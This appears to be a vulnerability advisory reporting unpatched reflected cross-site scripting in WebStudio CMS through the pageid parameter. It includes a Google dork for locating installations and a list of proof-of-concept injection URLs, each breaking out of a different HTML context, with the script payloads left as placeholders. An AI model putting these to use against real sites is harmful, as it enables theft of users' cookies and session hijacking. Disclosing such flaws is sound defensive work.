Subject: WebStudio Multiple XSS Vulnerabilities

Application:  WebStudio CMS

Vendors Url:  http://www.bdigital.biz

Bug Type:     Multiple URL Handling Remote Cross-Site Scripting Vulnerabilities

Exploitation: Remote

Severity: Less Critical 

Solution Status: Unpatched 

Introduction: WebStudio CMS is a web-based CMS system

Google Dork:  "Powered by WebStudio"


Description:

User-supplied input passed via the URL is not properly sanitised before it is being returned to the user in index.php?pageid=. This can be exploited to execute arbitrary script code in the security context of an affected website, as a result the code will be able to access any of the target user's cookies, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.


PoC:

http://[target]/?pageid=[XSS]
http://[target]/?pageid=</textarea>[XSS]
http://[target]/?pageid=</title>[XSS]
http://[target]/?pageid=-->[XSS]
http://[target]/?pageid=email@...ress.com[XSS]domain.com
http://[target]/?pageid=<body+onload=[XSS]
http://[target]/?pageid=</div>[XSS]
http://[target]/index.php?pageid=>'>[XSS]
http://[target]/index.php?pageid=</textarea>[XSS]
http://[target]/index.php?pageid=</title>[XSS]
http://[target]/index.php?pageid=-->[XSS]
http://[target]/index.php?pageid=email@...ress.com[XSS]domain.com
http://[target]/index.php?pageid=<body+onload=[XSS]
http://[target]/index.php?pageid=</div>[XSS]


Solution:

There was no vendor-supplied solution at the time of entry.

Edit source code manually to ensure user-supplied input is correctly sanitised.

Filter malicious characters and character sequences via a HTTP proxy or firewall with URL filtering capabilities.
